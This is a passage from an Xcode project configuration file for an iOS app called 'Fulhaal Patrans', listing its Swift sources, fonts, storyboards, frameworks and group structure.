// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		0302513526B05FF400E7ED4B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0302513426B05FF300E7ED4B /* GoogleService-Info.plist */; };
		032AC74126AB2F6A0055EC71 /* CIFilter+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 032AC74026AB2F6A0055EC71 /* CIFilter+Extension.swift */; };
		033C467026933134002A6681 /* ApiManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C466E26933134002A6681 /* ApiManager.swift */; };
		033C467126933134002A6681 /* NetworkingConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C466F26933134002A6681 /* NetworkingConstants.swift */; };
		033C46762693315F002A6681 /* AuthEndPoint.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C46752693315F002A6681 /* AuthEndPoint.swift */; };
		033C4679269333D3002A6681 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C4678269333D3002A6681 /* LoginViewModel.swift */; };
		033C467E26933404002A6681 /* LoginModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C467D26933404002A6681 /* LoginModel.swift */; };
		033C468226934A3E002A6681 /* DashboardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C468126934A3E002A6681 /* DashboardModel.swift */; };
		033C468526934A50002A6681 /* DashboardViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 033C468426934A50002A6681 /* DashboardViewModel.swift */; };
		034025BF26B59B9B00B1E5DF /* CropperExtensionViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 034025BC26B59B9B00B1E5DF /* CropperExtensionViewController.xib */; };
		034025C026B59B9B00B1E5DF /* ImagePreviewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 034025BD26B59B9B00B1E5DF /* ImagePreviewViewController.swift */; };
		034025C126B59B9B00B1E5DF /* CropperExtensionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 034025BE26B59B9B00B1E5DF /* CropperExtensionViewController.swift */; };
		034E9340279DBD13009105E8 /* TripHistoryTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 034E933F279DBD13009105E8 /* TripHistoryTableViewCell.swift */; };
		0355B33A268B68F000E5DA21 /* CloudKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0355B339268B68F000E5DA21 /* CloudKit.framework */; };
		0393644E268470BF008AE128 /* SelectDate.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0393644D268470BF008AE128 /* SelectDate.xib */; };
		03936451268470D3008AE128 /* SelectDate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03936450268470D3008AE128 /* SelectDate.swift */; };
		03C55D9D264662D500D0298E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55D9C264662D500D0298E /* AppDelegate.swift */; };
		03C55D9F264662D500D0298E /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55D9E264662D500D0298E /* SceneDelegate.swift */; };
		03C55DA6264662D700D0298E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 03C55DA5264662D700D0298E /* Assets.xcassets */; };
		03C55DA9264662D700D0298E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 03C55DA7264662D700D0298E /* LaunchScreen.storyboard */; };
		03C55DC52646759000D0298E /* Theme.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DBF2646759000D0298E /* Theme.swift */; };
		03C55DC62646759000D0298E /* HelperClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DC02646759000D0298E /* HelperClass.swift */; };
		03C55DC72646759000D0298E /* Logger.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DC12646759000D0298E /* Logger.swift */; };
		03C55DC82646759000D0298E /* ImageAndDocumentPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DC22646759000D0298E /* ImageAndDocumentPicker.swift */; };
		03C55DC92646759000D0298E /* LocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DC32646759000D0298E /* LocationManager.swift */; };
		03C55DCA2646759000D0298E /* PickerViewCustomDataSource.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DC42646759000D0298E /* PickerViewCustomDataSource.swift */; };
		03C55DD6264675B500D0298E /* UiTextFieldExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DCC264675B500D0298E /* UiTextFieldExtension.swift */; };
		03C55DD7264675B500D0298E /* UiViewControllerExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DCD264675B500D0298E /* UiViewControllerExtension.swift */; };
		03C55DD8264675B500D0298E /* UiLabelExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DCE264675B500D0298E /* UiLabelExtension.swift */; };
		03C55DD9264675B500D0298E /* StringExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DCF264675B500D0298E /* StringExtension.swift */; };
		03C55DDA264675B500D0298E /* UiViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DD0264675B500D0298E /* UiViewExtension.swift */; };
		03C55DDC264675B500D0298E /* extensionclass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DD2264675B500D0298E /* extensionclass.swift */; };
		03C55DDD264675B500D0298E /* DateExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DD3264675B500D0298E /* DateExtension.swift */; };
		03C55DDE264675B500D0298E /* UiImageExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DD4264675B500D0298E /* UiImageExtension.swift */; };
		03C55DDF264675B500D0298E /* UiColorExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55DD5264675B500D0298E /* UiColorExtension.swift */; };
		03C55DFF2647076000D0298E /* Authentication.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 03C55DFE2647076000D0298E /* Authentication.storyboard */; };
		03C55E022647079800D0298E /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55E012647079800D0298E /* LoginViewController.swift */; };
		03C55E1726470B7300D0298E /* Montserrat-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0526470B7200D0298E /* Montserrat-Italic.ttf */; };
		03C55E1826470B7300D0298E /* Montserrat-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0626470B7200D0298E /* Montserrat-MediumItalic.ttf */; };
		03C55E1926470B7300D0298E /* Montserrat-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0726470B7200D0298E /* Montserrat-Thin.ttf */; };
		03C55E1A26470B7300D0298E /* Montserrat-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0826470B7200D0298E /* Montserrat-BlackItalic.ttf */; };
		03C55E1B26470B7300D0298E /* Montserrat-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0926470B7200D0298E /* Montserrat-BoldItalic.ttf */; };
		03C55E1C26470B7300D0298E /* Montserrat-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0A26470B7200D0298E /* Montserrat-ThinItalic.ttf */; };
		03C55E1D26470B7300D0298E /* Montserrat-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0B26470B7200D0298E /* Montserrat-Medium.ttf */; };
		03C55E1E26470B7300D0298E /* Montserrat-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0C26470B7200D0298E /* Montserrat-Light.ttf */; };
		03C55E1F26470B7300D0298E /* Montserrat-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0D26470B7200D0298E /* Montserrat-ExtraBold.ttf */; };
		03C55E2026470B7300D0298E /* Montserrat-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0E26470B7200D0298E /* Montserrat-Bold.ttf */; };
		03C55E2126470B7300D0298E /* Montserrat-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E0F26470B7200D0298E /* Montserrat-Regular.ttf */; };
		03C55E2226470B7300D0298E /* Montserrat-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1026470B7200D0298E /* Montserrat-SemiBold.ttf */; };
		03C55E2326470B7300D0298E /* Montserrat-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1126470B7300D0298E /* Montserrat-SemiBoldItalic.ttf */; };
		03C55E2426470B7300D0298E /* Montserrat-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1226470B7300D0298E /* Montserrat-ExtraLightItalic.ttf */; };
		03C55E2526470B7300D0298E /* Montserrat-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1326470B7300D0298E /* Montserrat-ExtraBoldItalic.ttf */; };
		03C55E2626470B7300D0298E /* Montserrat-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1426470B7300D0298E /* Montserrat-LightItalic.ttf */; };
		03C55E2726470B7300D0298E /* Montserrat-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1526470B7300D0298E /* Montserrat-ExtraLight.ttf */; };
		03C55E2826470B7300D0298E /* Montserrat-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E1626470B7300D0298E /* Montserrat-Black.ttf */; };
		03C55E2C2647178D00D0298E /* DashBoardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55E2B2647178D00D0298E /* DashBoardViewController.swift */; };
		03C55E312647183100D0298E /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 03C55E302647183100D0298E /* Home.storyboard */; };
		03C55E3426471ABE00D0298E /* Common.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03C55E3326471ABE00D0298E /* Common.swift */; };
		03DC3B67269B30F60057549C /* TripHistoryViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03DC3B66269B30F60057549C /* TripHistoryViewModel.swift */; };
		03DC3B6A269B31020057549C /* TripHistoryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03DC3B69269B31020057549C /* TripHistoryModel.swift */; };
		03E631EE2647E63A00C65FA4 /* TripHistoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03E631ED2647E63A00C65FA4 /* TripHistoryViewController.swift */; };
		03EE2B772696228800AC7194 /* HomeEndPoints.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03EE2B762696228800AC7194 /* HomeEndPoints.swift */; };
		03F0E05C26AD50FE00FB4D31 /* GRQuickPreviewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 03F0E05B26AD50FE00FB4D31 /* GRQuickPreviewController.swift */; };
		42F89E5800E0A984ACE9F67F /* Pods_Fulhaal_Patrans.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D8A0E0CCE94DFC9FDA2201F4 /* Pods_Fulhaal_Patrans.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		0302513426B05FF300E7ED4B /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		032AC74026AB2F6A0055EC71 /* CIFilter+Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "CIFilter+Extension.swift"; sourceTree = "<group>"; };
		033C466E26933134002A6681 /* ApiManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ApiManager.swift; sourceTree = "<group>"; };
		033C466F26933134002A6681 /* NetworkingConstants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkingConstants.swift; sourceTree = "<group>"; };
		033C46752693315F002A6681 /* AuthEndPoint.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AuthEndPoint.swift; sourceTree = "<group>"; };
		033C4678269333D3002A6681 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		033C467D26933404002A6681 /* LoginModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginModel.swift; sourceTree = "<group>"; };
		033C468126934A3E002A6681 /* DashboardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardModel.swift; sourceTree = "<group>"; };
		033C468426934A50002A6681 /* DashboardViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardViewModel.swift; sourceTree = "<group>"; };
		034025BC26B59B9B00B1E5DF /* CropperExtensionViewController.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CropperExtensionViewController.xib; sourceTree = "<group>"; };
		034025BD26B59B9B00B1E5DF /* ImagePreviewViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ImagePreviewViewController.swift; sourceTree = "<group>"; };
		034025BE26B59B9B00B1E5DF /* CropperExtensionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CropperExtensionViewController.swift; sourceTree = "<group>"; };
		034E933F279DBD13009105E8 /* TripHistoryTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TripHistoryTableViewCell.swift; sourceTree = "<group>"; };
		0355B337268B68D800E5DA21 /* Fulhaal Patrans.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Fulhaal Patrans.entitlements"; sourceTree = "<group>"; };
		0355B339268B68F000E5DA21 /* CloudKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CloudKit.framework; path = System/Library/Frameworks/CloudKit.framework; sourceTree = SDKROOT; };
		0393644D268470BF008AE128 /* SelectDate.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SelectDate.xib; sourceTree = "<group>"; };
		03936450268470D3008AE128 /* SelectDate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectDate.swift; sourceTree = "<group>"; };
		03C55D99264662D500D0298E /* Fulhaal Patrans.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Fulhaal Patrans.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		03C55D9C264662D500D0298E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		03C55D9E264662D500D0298E /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		03C55DA5264662D700D0298E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		03C55DA8264662D700D0298E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		03C55DAA264662D700D0298E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		03C55DBF2646759000D0298E /* Theme.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Theme.swift; sourceTree = "<group>"; };
		03C55DC02646759000D0298E /* HelperClass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HelperClass.swift; sourceTree = "<group>"; };
		03C55DC12646759000D0298E /* Logger.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Logger.swift; sourceTree = "<group>"; };
		03C55DC22646759000D0298E /* ImageAndDocumentPicker.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ImageAndDocumentPicker.swift; sourceTree = "<group>"; };
		03C55DC32646759000D0298E /* LocationManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LocationManager.swift; sourceTree = "<group>"; };
		03C55DC42646759000D0298E /* PickerViewCustomDataSource.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PickerViewCustomDataSource.swift; sourceTree = "<group>"; };
		03C55DCC264675B500D0298E /* UiTextFieldExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiTextFieldExtension.swift; sourceTree = "<group>"; };
		03C55DCD264675B500D0298E /* UiViewControllerExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiViewControllerExtension.swift; sourceTree = "<group>"; };
		03C55DCE264675B500D0298E /* UiLabelExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiLabelExtension.swift; sourceTree = "<group>"; };
		03C55DCF264675B500D0298E /* StringExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StringExtension.swift; sourceTree = "<group>"; };
		03C55DD0264675B500D0298E /* UiViewExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiViewExtension.swift; sourceTree = "<group>"; };
		03C55DD2264675B500D0298E /* extensionclass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = extensionclass.swift; sourceTree = "<group>"; };
		03C55DD3264675B500D0298E /* DateExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateExtension.swift; sourceTree = "<group>"; };
		03C55DD4264675B500D0298E /* UiImageExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiImageExtension.swift; sourceTree = "<group>"; };
		03C55DD5264675B500D0298E /* UiColorExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UiColorExtension.swift; sourceTree = "<group>"; };
		03C55DFE2647076000D0298E /* Authentication.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Authentication.storyboard; sourceTree = "<group>"; };
		03C55E012647079800D0298E /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		03C55E0526470B7200D0298E /* Montserrat-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Italic.ttf"; sourceTree = "<group>"; };
		03C55E0626470B7200D0298E /* Montserrat-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-MediumItalic.ttf"; sourceTree = "<group>"; };
		03C55E0726470B7200D0298E /* Montserrat-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Thin.ttf"; sourceTree = "<group>"; };
		03C55E0826470B7200D0298E /* Montserrat-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-BlackItalic.ttf"; sourceTree = "<group>"; };
		03C55E0926470B7200D0298E /* Montserrat-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-BoldItalic.ttf"; sourceTree = "<group>"; };
		03C55E0A26470B7200D0298E /* Montserrat-ThinItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ThinItalic.ttf"; sourceTree = "<group>"; };
		03C55E0B26470B7200D0298E /* Montserrat-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Medium.ttf"; sourceTree = "<group>"; };
		03C55E0C26470B7200D0298E /* Montserrat-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Light.ttf"; sourceTree = "<group>"; };
		03C55E0D26470B7200D0298E /* Montserrat-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraBold.ttf"; sourceTree = "<group>"; };
		03C55E0E26470B7200D0298E /* Montserrat-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Bold.ttf"; sourceTree = "<group>"; };
		03C55E0F26470B7200D0298E /* Montserrat-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Regular.ttf"; sourceTree = "<group>"; };
		03C55E1026470B7200D0298E /* Montserrat-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-SemiBold.ttf"; sourceTree = "<group>"; };
		03C55E1126470B7300D0298E /* Montserrat-SemiBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
		03C55E1226470B7300D0298E /* Montserrat-ExtraLightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraLightItalic.ttf"; sourceTree = "<group>"; };
		03C55E1326470B7300D0298E /* Montserrat-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
		03C55E1426470B7300D0298E /* Montserrat-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-LightItalic.ttf"; sourceTree = "<group>"; };
		03C55E1526470B7300D0298E /* Montserrat-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraLight.ttf"; sourceTree = "<group>"; };
		03C55E1626470B7300D0298E /* Montserrat-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Black.ttf"; sourceTree = "<group>"; };
		03C55E2B2647178D00D0298E /* DashBoardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashBoardViewController.swift; sourceTree = "<group>"; };
		03C55E302647183100D0298E /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
		03C55E3326471ABE00D0298E /* Common.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Common.swift; sourceTree = "<group>"; };
		03DC3B66269B30F60057549C /* TripHistoryViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TripHistoryViewModel.swift; sourceTree = "<group>"; };
		03DC3B69269B31020057549C /* TripHistoryModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TripHistoryModel.swift; sourceTree = "<group>"; };
		03E631ED2647E63A00C65FA4 /* TripHistoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TripHistoryViewController.swift; sourceTree = "<group>"; };
		03EE2B762696228800AC7194 /* HomeEndPoints.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeEndPoints.swift; sourceTree = "<group>"; };
		03F0E05B26AD50FE00FB4D31 /* GRQuickPreviewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GRQuickPreviewController.swift; sourceTree = "<group>"; };
		D0301EB902DD2FFBA377A0FE /* Pods-Fulhaal Patrans.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Fulhaal Patrans.debug.xcconfig"; path = "Target Support Files/Pods-Fulhaal Patrans/Pods-Fulhaal Patrans.debug.xcconfig"; sourceTree = "<group>"; };
		D8A0E0CCE94DFC9FDA2201F4 /* Pods_Fulhaal_Patrans.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Fulhaal_Patrans.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		DF8E74824CCD3A059EF5429D /* Pods-Fulhaal Patrans.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Fulhaal Patrans.release.xcconfig"; path = "Target Support Files/Pods-Fulhaal Patrans/Pods-Fulhaal Patrans.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		03C55D96264662D500D0298E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				42F89E5800E0A984ACE9F67F /* Pods_Fulhaal_Patrans.framework in Frameworks */,
				0355B33A268B68F000E5DA21 /* CloudKit.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		033C467226933137002A6681 /* Interfaces */ = {
			isa = PBXGroup;
			children = (
				033C46752693315F002A6681 /* AuthEndPoint.swift */,
				03EE2B762696228800AC7194 /* HomeEndPoints.swift */,
			);
			path = Interfaces;
			sourceTree = "<group>";
		};
		033C467B269333DE002A6681 /* Authentication */ = {
			isa = PBXGroup;
			children = (
				033C467D26933404002A6681 /* LoginModel.swift */,
				033C468126934A3E002A6681 /* DashboardModel.swift */,
			);
			path = Authentication;
			sourceTree = "<group>";
		};
		033C467C269333F3002A6681 /* Home */ = {
			isa = PBXGroup;
			children = (
				03DC3B69269B31020057549C /* TripHistoryModel.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		034025BB26B59B4C00B1E5DF /* EditImg */ = {
			isa = PBXGroup;
			children = (
				034025BE26B59B9B00B1E5DF /* CropperExtensionViewController.swift */,
				034025BC26B59B9B00B1E5DF /* CropperExtensionViewController.xib */,
				034025BD26B59B9B00B1E5DF /* ImagePreviewViewController.swift */,
			);
			path = EditImg;
			sourceTree = "<group>";
		};
		0393644C268470A5008AE128 /* XIBs */ = {
			isa = PBXGroup;
			children = (
				0393644D268470BF008AE128 /* SelectDate.xib */,
				03936450268470D3008AE128 /* SelectDate.swift */,
			);
			path = XIBs;
			sourceTree = "<group>";
		};
		03C55D90264662D500D0298E = {
			isa = PBXGroup;
			children = (
				03C55D9B264662D500D0298E /* Fulhaal Patrans */,
				03C55D9A264662D500D0298E /* Products */,
				3C1665F205A132F01CA1FA2E /* Pods */,
				612B334FC691A7ED764B6CDE /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		03C55D9A264662D500D0298E /* Products */ = {
			isa = PBXGroup;
			children = (
				03C55D99264662D500D0298E /* Fulhaal Patrans.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		03C55D9B264662D500D0298E /* Fulhaal Patrans */ = {
			isa = PBXGroup;
			children = (
				0355B337268B68D800E5DA21 /* Fulhaal Patrans.entitlements */,
				03C55DBB2646750E00D0298E /* MVVM */,
				03C55DBA2646750300D0298E /* Supporting Files */,
				03C55DB6264674B100D0298E /* HelperClass */,
				03C55DA7264662D700D0298E /* LaunchScreen.storyboard */,
				03C55DAA264662D700D0298E /* Info.plist */,
				0302513426B05FF300E7ED4B /* GoogleService-Info.plist */,
			);
			path = "Fulhaal Patrans";
			sourceTree = "<group>";
		};
		03C55DB6264674B100D0298E /* HelperClass */ = {
			isa = PBXGroup;
			children = (
				03C55DB9264674EF00D0298E /* Common Files */,
				03C55DB8264674DB00D0298E /* Extension Classes */,
				03C55DB7264674CE00D0298E /* Networking */,
			);
			path = HelperClass;
			sourceTree = "<group>";
		};
		03C55DB7264674CE00D0298E /* Networking */ = {
			isa = PBXGroup;
			children = (
				033C467226933137002A6681 /* Interfaces */,
				033C466E26933134002A6681 /* ApiManager.swift */,
				033C466F26933134002A6681 /* NetworkingConstants.swift */,
			);
			path = Networking;
			sourceTree = "<group>";
		};
		03C55DB8264674DB00D0298E /* Extension Classes */ = {
			isa = PBXGroup;
			children = (
				032AC74026AB2F6A0055EC71 /* CIFilter+Extension.swift */,
				03C55DD3264675B500D0298E /* DateExtension.swift */,
				03C55DD2264675B500D0298E /* extensionclass.swift */,
				03C55DCF264675B500D0298E /* StringExtension.swift */,
				03C55DD5264675B500D0298E /* UiColorExtension.swift */,
				03C55DD4264675B500D0298E /* UiImageExtension.swift */,
				03C55DCE264675B500D0298E /* UiLabelExtension.swift */,
				03C55DCC264675B500D0298E /* UiTextFieldExtension.swift */,
				03C55DCD264675B500D0298E /* UiViewControllerExtension.swift */,
				03C55DD0264675B500D0298E /* UiViewExtension.swift */,
			);
			path = "Extension Classes";
			sourceTree = "<group>";
		};
		03C55DB9264674EF00D0298E /* Common Files */ = {
			isa = PBXGroup;
			children = (
				034025BB26B59B4C00B1E5DF /* EditImg */,
				03C55E0426470ADA00D0298E /* Fonts */,
				03C55DC02646759000D0298E /* HelperClass.swift */,
				03F0E05B26AD50FE00FB4D31 /* GRQuickPreviewController.swift */,
				03C55E3326471ABE00D0298E /* Common.swift */,
				03C55DC22646759000D0298E /* ImageAndDocumentPicker.swift */,
				03C55DC32646759000D0298E /* LocationManager.swift */,
				03C55DC12646759000D0298E /* Logger.swift */,
				03C55DC42646759000D0298E /* PickerViewCustomDataSource.swift */,
				03C55DBF2646759000D0298E /* Theme.swift */,
			);
			path = "Common Files";
			sourceTree = "<group>";
		};
		03C55DBA2646750300D0298E /* Supporting Files */ = {
			isa = PBXGroup;
			children = (
				03C55D9C264662D500D0298E /* AppDelegate.swift */,
				03C55D9E264662D500D0298E /* SceneDelegate.swift */,
				03C55DA5264662D700D0298E /* Assets.xcassets */,
			);
			path = "Supporting Files";
			sourceTree = "<group>";
		};
		03C55DBB2646750E00D0298E /* MVVM */ = {
			isa = PBXGroup;
			children = (
